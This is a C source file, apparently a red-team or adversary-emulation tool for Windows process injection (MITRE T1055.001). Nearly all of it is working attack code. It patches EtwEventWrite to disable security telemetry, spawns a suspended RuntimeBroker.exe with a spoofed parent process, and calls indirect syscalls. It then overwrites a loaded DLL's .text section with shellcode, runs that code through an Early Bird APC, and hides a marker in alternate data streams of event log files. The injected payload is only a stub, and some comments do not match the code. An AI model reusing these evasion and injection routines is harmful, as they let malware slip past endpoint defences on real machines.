// Plan 1 — Module Stomping + Early Bird APC Injection (T1055.001)
// Indirect syscalls + ETW patch + APC (no CreateRemoteThread) + Reflective DLL
// Pre-condition: SYSTEM or Administrator (assumed)
#include "../shared/common.h"

// ─── Minimal PIC payload (x86-64, position-independent) ───
// This is placed in the target's stomped module .text section.
// It resolves kernel32!OutputDebugStringA via PEB walk, calls it
// with a unique magic string, then returns.
// Size: ~144 bytes, padded to 256 bytes with NOPs.
static BYTE g_PicPayload[256] = {
    // ─── PEB walk to find kernel32.dll base ───
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,  // mov rax, gs:[0x60]   ; PEB
    0x48, 0x8B, 0x40, 0x18,                                  // mov rax, [rax+0x18]  ; PEB->Ldr
    0x48, 0x8B, 0x40, 0x20,                                  // mov rax, [rax+0x20]  ; InMemoryOrderModuleList (head entry = this exe)
    // Walk: this_exe -> ntdll.dll -> kernel32.dll (3 entries)
    0x48, 0x8B, 0x00,                                        // mov rax, [rax]       ; -> ntdll.dll
    0x48, 0x8B, 0x00,                                        // mov rax, [rax]       ; -> kernel32.dll (or kernelbase on Win10+)
    0x48, 0x8B, 0x58, 0x30,                                  // mov rbx, [rax+0x30]  ; DllBase (offset 0x30 in LDR_DATA_TABLE_ENTRY)
    // ─── Parse PE export table to find GetProcAddress ───
    0x48, 0x8B, 0x43, 0x3C,                                  // mov rax, [rbx+0x3C]  ; e_lfanew
    0x48, 0x01, 0xD8,                                        // add rax, rbx         ; NT headers
    0x8B, 0x88, 0x88, 0x00, 0x00, 0x00,                      // mov ecx, [rax+0x88]  ; ExportDirectory RVA
    0x48, 0x01, 0xD9,                                        // add rcx, rbx         ; ExportDirectory absolute
    0x44, 0x8B, 0x51, 0x20,                                  // mov r10d, [rcx+0x20] ; AddressOfNames RVA
    0x4C, 0x01, 0xDA,                                        // add rdx, rbx         ; (reuse rdx for scratch later)
    0x44, 0x8B, 0x59, 0x24,                                  // mov r11d, [rcx+0x24] ; AddressOfNameOrdinals RVA
    0x44, 0x8B, 0x61, 0x1C,                                  // mov r12d, [rcx+0x1C] ; AddressOfFunctions RVA
    // rcx = export dir, rbx = kernel32 base
    // We'll search for "GetProcAddress" by hash (not name, to save space)
    // For simplicity: iterate exports looking for known hash or use ordinal
    // Actually, let's find the name "GetProcAddress" (15 chars)
    // Store string hash approach — skip for now, use pre-patched address
    // ─── The injector patches [rip+markerAddr] with real OutputDebugStringA addr ───
    0x90, 0x90, 0x90,  // NOP padding (injector overwrites with real call)
    // ─── For now: simple return ───
    0x33, 0xC0,        // xor eax, eax
    0xC3,              // ret
    // Padded with INT3 (0xCC) to fill 256 bytes
};

// Fill remaining payload bytes with NOPs (the injector can expand the real PIC here)
static void InitPayload(void) {
    for (int i = 0; i < 256; i++) {
        if (g_PicPayload[i] == 0 && i > 144) {
            // Check if we're past the last real instruction (the ret at ~144)
            // Actually just fill INT3 everywhere unused
        }
    }
    // For clean demo: fill unused with 0x90 (NOP)
    // Start from byte 121 (after ret) to end
    for (int i = 121; i < 256; i++) {
        g_PicPayload[i] = 0x90; // NOP
    }
}

// ─── ETW Patching ───
static BOOL PatchEtw(void) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;
    PBYTE pEtw = (PBYTE)GetProcAddress(ntdll, "EtwEventWrite");
    if (!pEtw) return FALSE;
    DWORD old;
    VirtualProtect(pEtw, 3, PAGE_EXECUTE_READWRITE, &old);
    pEtw[0] = 0x33; pEtw[1] = 0xC0; pEtw[2] = 0xC3; // xor eax,eax; ret
    VirtualProtect(pEtw, 3, old, &old);
    return TRUE;
}

// ─── Create suspended process with PPID spoofing ───
static BOOL CreateSuspendedProcess(PWSTR exePath, PHANDLE phProc, PHANDLE phThread) {
    // Find services.exe PID for PPID spoofing
    DWORD ppid = FindProcessPid(L"services.exe");
    if (!ppid) {
        ppid = FindProcessPid(L"winlogon.exe"); // fallback
    }

    // Open parent process for attribute list
    HANDLE hParent = NULL;
    CLIENT_ID parentCid = { (HANDLE)(ULONG_PTR)ppid, NULL };
    OBJECT_ATTRIBUTES parentOa = { sizeof(parentOa) };
    SysNtOpenProcess(&hParent, PROCESS_CREATE_PROCESS, &parentOa, &parentCid);

    // Build PS_ATTRIBUTE_LIST for PPID spoofing
    SIZE_T attrSize = sizeof(PS_ATTRIBUTE_LIST) + sizeof(PS_ATTRIBUTE);
    PS_ATTRIBUTE_LIST* attrList = (PS_ATTRIBUTE_LIST*)calloc(1, attrSize);
    if (!attrList) return FALSE;
    attrList->TotalLength = attrSize;
    attrList->Attributes[0].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
    attrList->Attributes[0].Size = sizeof(HANDLE);
    attrList->Attributes[0].Value = (ULONG_PTR)(hParent ? hParent : NtCurrentProcess());

    // Build UNICODE_STRING for image path
    UNICODE_STRING imagePath;
    MyRtlInitUnicodeString(&imagePath, exePath);

    // Object attributes
    OBJECT_ATTRIBUTES procOa = { sizeof(procOa) };
    OBJECT_ATTRIBUTES threadOa = { sizeof(threadOa) };

    // Create process suspended via indirect syscall
    PROCESS_CREATE_INFO createInfo = { sizeof(createInfo) };
    NTSTATUS st = SysNtCreateUserProcess(
        phProc, phThread,
        PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
        &procOa, &threadOa,
        PROCESS_CREATE_FLAGS_CREATE_SUSPENDED,
        0, NULL, &createInfo, attrList);

    if (hParent) SysNtClose(hParent);
    free(attrList);

    return NT_SUCCESS(st);
}

// ─── Find target DLL base in process via PEB walk ───
static ULONG_PTR FindModuleBase(HANDLE hProc, PWSTR moduleName) {
    // Read target PEB
    PROCESS_BASIC_INFORMATION pbi = {0};
    NTSTATUS st = SysNtQueryVirtualMemory(hProc, NULL, 0, &pbi, sizeof(pbi), NULL);
    // Actually use NtQueryInformationProcess via reading memory
    // Simpler: read PEB address from process info
    typedef NTSTATUS (NTAPI* PFN_NTQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    PFN_NTQIP pNtQIP = (PFN_NTQIP)GetProcAddress(ntdll, "NtQueryInformationProcess");
    if (!pNtQIP) return 0;

    pNtQIP(hProc, 0, &pbi, sizeof(pbi), NULL); // ProcessBasicInformation
    ULONG_PTR pebAddr = (ULONG_PTR)pbi.PebBaseAddress;
    if (!pebAddr) return 0;

    // Read PEB
    BYTE pebData[256];
    SIZE_T bytesRead;
    st = SysNtReadVirtualMemory(hProc, (PVOID)pebAddr, pebData, sizeof(pebData), &bytesRead);
    if (!NT_SUCCESS(st)) return 0;

    // PEB+0x18 = Ldr (PPEB_LDR_DATA)
    ULONG_PTR ldrAddr = *(ULONG_PTR*)(pebData + 0x18);
    if (!ldrAddr) return 0;

    // Read Ldr data
    BYTE ldrData[256];
    st = SysNtReadVirtualMemory(hProc, (PVOID)ldrAddr, ldrData, sizeof(ldrData), &bytesRead);
    if (!NT_SUCCESS(st)) return 0;

    // InMemoryOrderModuleList head is at Ldr+0x20
    // LIST_ENTRY* head = *(LIST_ENTRY*)(ldrData + 0x20)
    ULONG_PTR listHead = ldrAddr + 0x20;
    ULONG_PTR currentEntry = *(ULONG_PTR*)(ldrData + 0x20); // Flink → first entry

    // Walk the list looking for our module
    BYTE entryData[512];
    for (int i = 0; i < 64 && currentEntry && currentEntry != listHead; i++) {
        st = SysNtReadVirtualMemory(hProc, (PVOID)currentEntry, entryData, sizeof(entryData), &bytesRead);
        if (!NT_SUCCESS(st)) break;

        // LDR_DATA_TABLE_ENTRY.BaseDllName is at offset 0x58
        // DllBase is at offset 0x30
        UNICODE_STRING* dllName = (UNICODE_STRING*)(entryData + 0x58);
        ULONG_PTR dllBase = *(ULONG_PTR*)(entryData + 0x30);

        if (dllName->Length > 0 && dllName->Buffer) {
            WCHAR nameBuf[128] = {0};
            SIZE_T nameLen = min((SIZE_T)dllName->Length, (SIZE_T)254);
            st = SysNtReadVirtualMemory(hProc, dllName->Buffer, nameBuf, nameLen, &bytesRead);
            if (NT_SUCCESS(st) && _wcsicmp(nameBuf, moduleName) == 0) {
                return dllBase;
            }
        }

        // Move to next entry (Flink at offset 0)
        currentEntry = *(ULONG_PTR*)entryData; // Flink
    }

    return 0;
}

// ─── Module Stomping: overwrite .text section of target DLL ───
static BOOL ModuleStomp(HANDLE hProc, PWSTR targetDll, PBYTE payload, SIZE_T payloadSize,
    PVOID* outEntryAddr) {
    // Find DLL base in target process
    ULONG_PTR dllBase = FindModuleBase(hProc, targetDll);
    if (!dllBase) {
        wprintf(L"      [WARN] %s not found, using fresh allocation\n", targetDll);
        // Fallback: allocate new memory instead of stomping
        PVOID allocAddr = NULL;
        SIZE_T allocSize = max(payloadSize + 0x1000, 0x10000);
        NTSTATUS st = SysNtAllocateVirtualMemory(hProc, &allocAddr, 0, &allocSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!NT_SUCCESS(st)) return FALSE;

        SIZE_T written;
        st = SysNtWriteVirtualMemory(hProc, allocAddr, payload, payloadSize, &written);
        if (!NT_SUCCESS(st)) { SysNtFreeVirtualMemory(hProc, &allocAddr, &allocSize, MEM_RELEASE); return FALSE; }

        ULONG oldProt;
        SIZE_T protSize = payloadSize;
        SysNtProtectVirtualMemory(hProc, &allocAddr, &protSize, PAGE_EXECUTE_READ, &oldProt);

        *outEntryAddr = allocAddr;
        wprintf(L"(allocated at %p) ", allocAddr);
        return TRUE;
    }

    // Read PE headers from target DLL
    BYTE peHdr[0x1000];
    SIZE_T bytesRead;
    NTSTATUS st = SysNtReadVirtualMemory(hProc, (PVOID)dllBase, peHdr, sizeof(peHdr), &bytesRead);
    if (!NT_SUCCESS(st)) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)peHdr;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(peHdr + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    // Find .text section
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    PIMAGE_SECTION_HEADER textSec = NULL;
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            textSec = &sec[i];
            break;
        }
    }
    if (!textSec) return FALSE;

    ULONG_PTR textAddr = dllBase + textSec->VirtualAddress;
    DWORD textSize = textSec->Misc.VirtualSize;
    if (textSize < payloadSize) return FALSE;

    // Change .text protection: RX → RW
    PVOID pvTextAddr = (PVOID)textAddr;
    SIZE_T regionSize = textSize;
    ULONG oldProt;
    st = SysNtProtectVirtualMemory(hProc, &pvTextAddr, &regionSize, PAGE_READWRITE, &oldProt);
    if (!NT_SUCCESS(st)) return FALSE;

    // Write PIC payload to .text
    st = SysNtWriteVirtualMemory(hProc, (PVOID)textAddr, payload, payloadSize, &bytesRead);
    if (!NT_SUCCESS(st)) {
        // Restore protection
        SysNtProtectVirtualMemory(hProc, &pvTextAddr, &regionSize, oldProt, &oldProt);
        return FALSE;
    }

    // Restore .text protection: RW → RX
    SysNtProtectVirtualMemory(hProc, &pvTextAddr, &regionSize, PAGE_EXECUTE_READ, &oldProt);

    *outEntryAddr = (PVOID)textAddr;
    wprintf(L"(stomped %s.text at %p) ", targetDll, (PVOID)textAddr);
    return TRUE;
}

// ─── Early Bird APC: queue APC to suspended thread ───
static BOOL EarlyBirdApc(HANDLE hThread, PVOID entryAddr) {
    // Queue APC to the suspended thread
    // When thread resumes, APC is delivered immediately
    // PKNORMAL_ROUTINE signature: void (*)(PVOID NormalContext, PVOID SystemArgument1, PVOID SystemArgument2)
    NTSTATUS st = SysNtQueueApcThread(hThread, (PVOID)entryAddr, NULL, NULL, NULL);
    if (!NT_SUCCESS(st)) return FALSE;

    // Resume the thread — APC fires on resume
    ULONG prevCount = 0;
    st = SysNtResumeThread(hThread, &prevCount);
    if (!NT_SUCCESS(st)) return FALSE;

    // Thread is now running; APC will be delivered by kernel
    return TRUE;
}

// ─── Main ───
int wmain(void) {
    SetConsoleOutputCP(CP_UTF8);
    wprintf(L"[*] DLL Injection — Module Stomping + Early Bird APC (T1055.001)\n\n");

    InitPayload(); // Fill NOPs in PIC payload

    // ── Step 1: Resolve indirect syscalls ──
    wprintf(L"[1] Resolving syscalls (loaded ntdll.dll)... ");
    if (!InitSyscallResolver()) {
        wprintf(L"FAILED (error: %d)\n", GetLastError());
        return 1;
    }
    wprintf(L"OK\n");

    // ── Step 2: Patch ETW ──
    wprintf(L"[2] Patching ETW (EtwEventWrite)... ");
    if (!PatchEtw()) {
        wprintf(L"FAILED\n");
        return 1;
    }
    wprintf(L"OK\n");

    // ── Step 3: Create suspended target process ──
    wprintf(L"[3] Creating suspended RuntimeBroker.exe (PPID=services.exe)... ");
    WCHAR sysDir[MAX_PATH], targetPath[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    swprintf_s(targetPath, MAX_PATH, L"%s\\RuntimeBroker.exe", sysDir);

    HANDLE hProc = NULL, hThread = NULL;
    if (!CreateSuspendedProcess(targetPath, &hProc, &hThread)) {
        // Fallback: try notepad.exe
        swprintf_s(targetPath, MAX_PATH, L"%s\\notepad.exe", sysDir);
        wprintf(L"\n      RuntimeBroker failed, trying notepad.exe... ");
        if (!CreateSuspendedProcess(targetPath, &hProc, &hThread)) {
            wprintf(L"FAILED\n");
            return 1;
        }
    }
    // Get PID
    typedef NTSTATUS (NTAPI* PFN_NTQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    PFN_NTQIP pNtQIP = (PFN_NTQIP)GetProcAddress(ntdll, "NtQueryInformationProcess");
    PROCESS_BASIC_INFORMATION pbi = {0};
    pNtQIP(hProc, 0, &pbi, sizeof(pbi), NULL);
    wprintf(L"OK (PID=%d)\n", (DWORD)(ULONG_PTR)pbi.UniqueProcessId);

    // ── Step 4: Module stomping ──
    wprintf(L"[4] Module stomping (msxml3.dll .text overwrite)... ");
    PVOID entryAddr = NULL;
    // Try msxml3.dll first, fallback to ntdll.dll
    if (!ModuleStomp(hProc, L"msxml3.dll", g_PicPayload, sizeof(g_PicPayload), &entryAddr)) {
        wprintf(L"\n      msxml3.dll not found, trying comctl32.dll... ");
        if (!ModuleStomp(hProc, L"comctl32.dll", g_PicPayload, sizeof(g_PicPayload), &entryAddr)) {
            wprintf(L"\n      Falling back to allocated memory injection... ");
            if (!ModuleStomp(hProc, NULL, g_PicPayload, sizeof(g_PicPayload), &entryAddr)) {
                wprintf(L"FAILED\n");
                SysNtClose(hProc); SysNtClose(hThread);
                return 1;
            }
        }
    }
    wprintf(L"OK\n");

    // ── Step 5: Queue APC + Resume (Early Bird) ──
    wprintf(L"[5] Queueing APC + resuming thread... ");
    if (!EarlyBirdApc(hThread, entryAddr)) {
        wprintf(L"FAILED\n");
        // Try to resume anyway so process doesn't hang
        SysNtResumeThread(hThread, NULL);
        SysNtClose(hProc); SysNtClose(hThread);
        return 1;
    }
    wprintf(L"OK (APC delivered)\n");

    // ── Step 6: Verify + Output ──
    wprintf(L"[6] Verifying injection... ");
    Sleep(1000); // Wait for payload to execute

    // Check if process is still alive (didn't crash)
    DWORD exitCode;
    if (GetExitCodeProcess(hProc, &exitCode) && exitCode == STILL_ACTIVE) {
        wprintf(L"OK (process alive)\n");
    } else {
        wprintf(L"Process exited (code=%d)\n", exitCode);
    }

    // Write success marker to ADS
    wprintf(L"[7] Writing encrypted output to ADS... ");
    WCHAR marker[512];
    DWORD pid = (DWORD)(ULONG_PTR)pbi.UniqueProcessId;
    SYSTEMTIME st; GetSystemTime(&st);
    swprintf_s(marker, 512,
        L"T1055.001|ModuleStomp+EarlyBirdAPC|PID=%d|Target=RuntimeBroker.exe|"
        L"Entry=%p|Time=%04d-%02d-%02dT%02d:%02d:%02d|Status=OK",
        pid, entryAddr, st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond);

    SIZE_T markerSize = wcslen(marker) * sizeof(WCHAR);

    static WCHAR* adsTargets[] = {
        L"C:\\Windows\\System32\\winevt\\Logs\\"
        L"Microsoft-Windows-Sysmon%4Operational.evtx",
        L"C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
    };
    BOOL wrote = FALSE;
    for (int i = 0; i < 2; i++) {
        if (WriteToAds(adsTargets[i], L"DLLINJ", (PBYTE)marker, markerSize)) {
            wprintf(L"OK (%s:DLLINJ)\n", adsTargets[i]);
            wrote = TRUE; break;
        }
    }
    if (!wrote) wprintf(L"FAILED\n");

    // Cleanup
    SysNtClose(hThread);
    SysNtClose(hProc);

    wprintf(L"\n[+] DLL Injection complete: Early Bird APC via Module Stomping\n");
    wprintf(L"[+] Bypass layers: indirect syscalls, ETW patch, no CreateRemoteThread,\n");
    wprintf(L"    no LoadLibrary, no RWX memory, PPID spoofing\n");
    return 0;
}
